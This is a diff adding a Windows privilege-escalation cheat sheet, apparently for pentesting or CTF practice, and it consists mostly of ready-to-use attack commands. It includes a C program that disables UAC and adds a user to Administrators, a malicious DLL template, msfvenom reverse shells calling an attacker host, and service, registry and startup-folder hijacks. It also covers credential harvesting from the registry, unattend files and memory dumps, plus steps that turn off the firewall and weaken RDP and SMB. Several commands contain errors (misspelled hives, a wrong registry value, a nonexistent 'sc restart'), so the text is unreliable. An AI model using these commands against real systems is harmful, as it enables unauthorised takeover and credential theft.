@@ -1,0 +1,248 @@
+*************************************
+| WINDOWS PRIV ESCALATION CHECKLIST |
+*************************************
+
+***************
+| ENUMERATION |
+***************
+
+(Assumption: using CMD and not Powershell)
+What privileges do we have? -> "whoami /priv"
+What users are on this machine? -> "net users"
+	Details on specific user? -> "net user <username>"
+Any user currently logged in simultaneously? -> "qwinsta" or "query session"
+What User groups are there locally? -> "net localgroup"
+	Specific group details? -> "net localgroup <groupname>"
+Information about this system (similar to kernel/ OS/ etc) -> "systeminfo"
+What system are we on? -> "hostname"
+I need to find ______: (move to C:\ first)
+	A file called 'password.txt' -> "findstr /si password *.txt" (can replace *.txt with *.xml and *.ini)
+What patches are installed on this system, and when? -> "wmic qfe get Caption,Description,HotFixID,InstalledOn"
+	Newer versions of Windows may require use of WMIC powershell cmdlet, fair warning.
+What Network Connections are active? -> "netstat -ano" (includes PID)
+What scheduled tasks are there? -> "schtasks /query /fo LIST /v"
+What drivers are there installed? -> "driverquery"
+Is Windows Defender turned on? -> "sc query windefend"
+What services are running? -> "sc queryex type=service" (long list) OR "sc query"
+Antivirus installed? -> wmic /node:localhost /namespace:\\root\SecurityCenter2 path AntiVirusProduct Get DisplayName | findstr /V /B /C:displayName || echo No Antivirus installed
+Firewalls? -> netsh advfirewall show allprofiles
+ACL Permissions? -> icacls.exe C:\directory
+	OR: accesschk -s -w -u <user> "C:\Program Files\"
+Check if UAC is enabled->  reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\
+        (Check "EnableLUA"; 0x1 = activated && Check "ConsentPromptBehaviorAdmin": anything other than 0 than it's enabled)
+Is RDP enabled?-> reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"
+	(Check "fDenyTSConnections"; 0x0 = enabled; 0x1 = disabled)
+Allow RDP through firewall-> netsh advfirewall firewall set rule group="remote desktop" new enable=yes
+
+Good commands to know:
+	PS> Get-Acl <file/ directory> -> Gets Access Control Perms without using AccessChk.exe
+
+***********************
+| VULNERABLE SERVICES |
+***********************
+
+Enumerate all-> "sc query"
+What are they?
+	Vulnerable services may pop up during enumeration. These services may have known CVEs, if not patched.
+Check the version of a service by going to it's folder. Right click -> Properties. Search the version for any known exploits on ExploitDB, or 'searchsploit'
+What software is installed on this system?
+	"wmic product get name,version,vendor"
+	NOTICE: since there's some backwards compatability issues via 32 bit and 64 bit systems, this output is NOT all inclusive.
+What services are RUNNING on the system?
+	'wmic service list brief | findstr "Running"'
+Query a specific service -> "sc qc <service>"
+
+Additionally, if the service is running at a high fidelity, and has RW permissions, we can just replace it w/ a reverse shell or something.
+	PS> Get-Acl "C:\VulnerableService.exe" -OR- Cmd> icacls.exe "C:\VulnerableService.exe"
+	<replace w/ msfvenom exe or similar>
+	sc start <serviceName> -OR- net start <serviceName>
+Alternatively, if a reverse shell isn't working, we can just use our own binary:
+------------------------------------------------------
+#include <stdlib.h>
+int main ()
+{
+  int i;
+  i = system ("reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0x0 /f");
+  i = system ("net localgroup Administrators USERNAME /add");
+  return 0;
+}
+------------------------------------------------------
+^ This disables UAC (if able), and adds our user to the local admin group.
+	i686-w64-mingw32-gcc malicious.c -o Malicious.exe
+	Then just move over to host, and replace the .exe associated with the running service.
+To stop/ restart service:
+	net stop/ sc stop <serviceName>
+	net start/ sc start <serviceName>
+Alternatively, restart host:
+	shutdown /r /t 0
+
+********************
+| WINDOWS REGISTRY |
+********************
+
+Credentials:
+Sometimes sensitive information can be found in the registry, like so:
+	Check for passwords in plaintext: "reg query HKLM /f password /t REG_SZ /s"
+	Autologon Credentials: reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+	If found, try using winexe/psexec to spawn a command prompt:
+		winexe -U 'user%password' //$IP cmd.exe
+		psexec.py user@$IP cmd.exe
+	Another quick check: "winpeas.exe filesinfo" OR "winpeas.exe windowscreds"
+
+Weak Registry Service:
+Sometimes a weak registry service is available for us to exploit: ("sc query" to query all services)
+	Check: "sc qc regsvc" ('regsvc' can be changed to anything, just an example)
+	Check if the same service is writeable: "accesschk.exe -accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc"
+	Overwrite ImagePath to reverse shell: "reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\reverse.exe /f"
+		net start regsvc
+
+*****************
+| DLL HIJACKING |
+*****************
+
+What are they?
+	DLL Hijacking is when you replace a service's legitimate DLL with a malicious one. Often this occurs due to insecure read/write perms and object references.
+Applications will first look for their associated DLL file within their local folder, then often the system, and then Windows' directory. This order can change if "SafeDLLSearchMode" is enabled or not.
+How do you check if an application/ service has a vulnerable DLL?
+	Load/ Install it on your own machine, and use Proccess Monitor (Sysinternals) to check WHERE it looks for DLLs.
+	If a DLL for this application is in a vulnerable directory (ie C:\Temp), we can replace it with a malicious one.
+Creating a malicious DLL (this part on Kali):
+	"#include <windows.h>
+	
+	BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+		if (dwReason == DLL_PROCESS_ATTACH) {
+			system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
+			ExitProcess(0);
+		}
+		return TRUE;
+	}"
+You can replace the code after 'system' to do anything you want. For example, change the admin account's password:
+	"cmd.exe /k net user Administrator Password123!"
+Next, compile this into a DLL Windows can read:
+	"x86_64-w64-ming32-gcc windows_dll.c -shared -o output.dll"
+	"apt install gcc-mingw-w64-x86-64" if you don't have it installed.
+Bring it onto the target system, after using a http python server -> "wget -O <output file> <attackerIP>:<port>/<DLL name>"
+You may need to restart this service:
+	"sc stop <service> & sc start <service>"
+Note: if you can't restart a service due to permissions, try restarting the host: "shutdown -r"
+
+*************************
+| UNQUOTED SERVICE PATH |
+*************************
+
+What are they?
+	Unquoted service paths are seen when using "sc query <service>", where the BINARY_PATH_NAME may not have quotes around spaces found in folder names.
+	Example: C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+Because of how Windows handles spaces in paths (when not quoted), it looks for a folder by that name first, before moving on.
+This means that, in the above case, Windows checks for the following, in order:
+	C:\Program.exe
+	C:\Program Files\Unquoted.exe
+	C:\Program Files\Unquoted Path Service\Common.exe
+	C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+If we can write to ANY of these directories, we have a valid method of attack.
+
+Finding possible services to exploit? -> "wmic service get name,displayname,pathname,startmode"
+Something catch your eye? -> "sc qc <service>"
+Either check in the subfolders (right click -> Properties -> security/etc) for write perms, or use 'accesschk64.exe' (Sysinternals)
+Create a malicious executable file (Kali):
+	msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI IP Address] LPORT=[PORT # you're using for revShell] -f exe > executable_name.exe
+Bring it onto the target system, after using a http python server -> "wget -O <output file> <attackerIP>:<port>/<executable name>"
+Start the service -> "sc start <service>"
+Note: if you can't restart a service due to permissions, try restarting the host: "shutdown -r"
+
+***********************
+| TOKEN IMPERSONATION |
+***********************
+
+What are they?
+	Token impersonation can occur when you have "SeImpersonatePrivilege" on an account. This is usually a security misconfiguration, if enabled.
+There's many different exploits that take advantage of this, look into a few of the following (largely automated, but each different):
+	Hot Potato (uses WAPD and NTLM Hanshake)
+	Rotten Potato
+	Print Spoofer
+
+************************
+| STARTUP APPLICATIONS |
+************************
+
+There's rare scenarios where an admin may login every so often, and where all users can put files into the startup folder. In these rare cases, we can simply put a reverse shell into the startup folder, and wait for a login to pivot users (hopefully to an admin):
+	icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+If the output shows "BUILTIN\Users:<OI><CI><F>", then we have write permissions.
+Generate reverse shell via msfvenom:
+	msfvenom -p windows/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o malicious.exe
+Then simply put into the startup folder, logout, and wait for someone to login on your reverse shell.
+
+************************************
+| SCHEDULED TASKS (MISSING BINARY) |
+************************************
+
+If you see a scheduled task that is missing a binary, and you have write permissions to that folder, we can replace it with a malicious exe:
+	Autoruns.exe
+	Check for any "missing binary". If you need a copy of this, sysinternals has this package. Once you've found one:
+	Accesschk.exe -w "C:\Path\To\Missing\Binary\"
+If we have RW permissions, we are a-go:
+	msfvenom -p windows/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o malicious.exe
+
+***************************
+| MISC. LOW HANGING FRUIT |
+***************************
+
+Sometimes things don't have to be hard. Check these for easy methods of PrivEsc:
+	1) Schtaks (any scheduled tasks we can exploit?)
+	2) AlwaysInstallElevated (installed apps run as Admin)
+		Check via 2 registry keys (BOTH need to be set):
+			reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+			reg query KHLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+		If so, make a malicious reverse shell .msi file, and upload/ run:
+			msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
+		Run on target system -> "msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi"
+	3) Passwords in easy locations? Search via 'findstr' commands.
+	4) Saved Credentials -> "cmdkey /list"
+		If you find anything of note, try running malicious .exe as that user: "runas /savecred /user:admin reverse_shell.exe"
+	5) Registry Keys (may contain passwords):
+		reg query HKLM /f password /t REG_SZ /s
+		reg query HKCU /f password /t REG_SZ /s
+		reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername
+		reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+	6) Unattended installation files still around?
+		'Unattend.xml` files usually have plaintext admin passwords. Use 'findstr' to see if any are laying around.
+		Check following locations:
+			C:\unattend.xml
+			C:\Windows\Username\Unattend.xml
+			C:\Windows\Username\Unattend\Unattend.xml
+			C:\Windows\system32\sysprep.inf
+			C:\Windows\system32\sysprep\sysprep.xml
+			C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+			C:\inetpub\wwwroot\web.config
+			C:\ProgramData\McAfee\Common Framework\Sitelist.xml
+		https://pentestlab.blog/tag/unattend/
+	7) Password Mining from memory (logged in users):
+		Task Manager> right click iexplore.exe -> create dump file
+		kali> strings iexpore.dmp | grep "Authorization: Basic"
+	8) Service running with RW permissions:
+		Check with "cmd> sc query <service>" for services that have RW perms on them (check w/ AccessChk.exe "C:\Vulnerable.exe")
+		Replace w/ reverse shell or local admin grp cmd, and then re-run:
+		cmd> sc restart <service>
+	9) Registry service running with RW permisisons:
+		PS> Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\services\regsvc : fl
+		Assuming your group/ user has RW perms, make a malicious .exe via msfvenom/ similar
+		reg.exe add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND|SZ /d C:\Temp\malicious.exe /f
+	10) Services binpath:
+		AccessChk.exe -wuvc daclsvc
+		(Assuming RW perms)
+		sc config daclsvc binpath= "net localgroup administrators <username> /add"
+
+*****************************************
+| POST-EXPLOIT: WEAKEN SECURITY POSTURE |
+*****************************************
+
+Add users as you like to Remote Desktop Users group, it's just a nice touch to work with.
+Remove passwd requirements for RDP users:
+        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v LimitBlankPasswordUse /t REG_DWORD /d 1 /f
+Change password across domain:
+        net user <username> <password> /domain
+Disable Firewall:
+        NetSh Advfirewall set allprofiles state off
+Allow insecure file transfer (bypass Group Policy):
+        reg delete HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth /f
+        reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth /d 0x1 /f
